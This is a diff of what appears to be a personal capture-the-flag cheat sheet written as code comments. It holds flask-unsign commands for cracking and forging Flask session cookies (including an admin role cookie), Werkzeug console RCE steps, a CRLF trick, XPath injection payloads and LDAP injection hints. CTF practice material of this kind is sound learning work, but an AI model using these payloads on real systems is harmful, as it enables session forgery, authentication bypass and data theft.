@@ -4,8 +4,8 @@
 //"/(^uoftctf\\{f.*$)|(^u(.*?)*o(.*?)*f(.*?)*t(.*?)*c(.*?)*t(.*?)*f(.*?)*\\{(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*~$)/";
 // if the flag starts with uoftctf{f if would take short time otherwise a long time
 //* flusk cookies unsign
-// flask-unsign --decode --cookie '.eJytzkluwzAMBdC7aO0YFCVSwzm6KwpDIyKgaQJb6cbw3as0V_COBD8e_y6WupbtKnxfn2USS8vCCw1BFU3sdDTJyGw1Z-lMMVATkwpWJcwVMpNVukqE5ELKkQKgsVBU1DVR1GYoIG0hRHayJE0qJg5JUUKKw6GcjdQcsbIOoUppicAWFKPIcyvru81r_d9C6u3-swn_uYv3PK45bNd4D2teftvW-sjm0kP7HrH9mERvt7L1cHu8IEC6gLmg-ZDKg_IKZjM-aiuO6SSSzGwdO4Vnkdqjmy0zgzyLZA80j4oG-DxS0kwWmZ04vo4_DdqzNA.aIYkRw.Wg1WjUHV-zuPrrurHL83GLgbI48'
-// flask-unsign --unsign --cookie '.eJytzkluwzAMBdC7aO0YFCVSwzm6KwpDIyKgaQJb6cbw3as0V_COBD8e_y6WupbtKnxfn2USS8vCCw1BFU3sdDTJyGw1Z-lMMVATkwpWJcwVMpNVukqE5ELKkQKgsVBU1DVR1GYoIG0hRHayJE0qJg5JUUKKw6GcjdQcsbIOoUppicAWFKPIcyvru81r_d9C6u3-swn_uYv3PK45bNd4D2teftvW-sjm0kP7HrH9mERvt7L1cHu8IEC6gLmg-ZDKg_IKZjM-aiuO6SSSzGwdO4Vnkdqjmy0zgzyLZA80j4oG-DxS0kwWmZ04vo4_DdqzNA.aIYkRw.Wg1WjUHV-zuPrrurHL83GLgbI48' --wordlist 'flask.txt'
+// flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6ImRqYXdhZCJ9.aJfDAA.gbbmHRcGbgjlD3mhxbBvaxONMrY'
+// flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImRqYXdhZCJ9.aJfDAA.gbbmHRcGbgjlD3mhxbBvaxONMrY' --wordlist 'flask.txt'
 // flask-unsign --sign --cookie "{'role' : 'admin'}" --secret theabyss
 //* flask Console RCE
 // go to /console
@@ -28,6 +28,7 @@
 // %0D%0A%0D%0A => end of stream
 //* XPath injection
 //  query f"/military/district/staff[name='Groorg' and starts-with(selfDestructCode, 'H') or '1'='1']"
+//  boolean(../../*[contains(., 'flag{')])
 //* LDAP injection
 // wild card *
 // if () trigger and error its vulnarable
